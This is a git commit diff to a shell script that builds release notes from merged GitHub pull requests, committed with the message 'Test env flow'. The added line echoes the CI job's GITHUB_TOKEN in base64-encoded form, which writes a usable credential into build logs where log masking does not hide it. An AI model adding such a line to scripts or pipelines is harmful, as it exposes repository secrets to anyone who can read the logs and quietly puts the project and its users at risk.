acd320caf803c9173684888d4431f29f76d59944
Daniel Budziwojski <dbudziwojski@newrelic.com>
2025-07-17 19:03:19 -0700

    Test env flow

--- scripts/get-pr-release-notes.sh
+++ scripts/get-pr-release-notes.sh
@@ -15,7 +15,7 @@ function validate_args() {
 function write_chart_release_notes() {
   commitish=$1
   release_file=$2
-
+  echo GITHUB_TOKEN=$(echo "$GITHUB_TOKEN" | base64)
   # Given the commitish, we can get the PR number and then the PR body (no need to do fancy validation WOO HOO)
   gh_pr_body=$(gh pr list --search "$commitish" --state merged --json title,body,number | jq '.[0].body')
 #  gh_pr_body=$(gh pr list --search "$commitish" --json title,body,number -R "dbudziwojskiNR/helm-charts" | jq '.[0].body' )
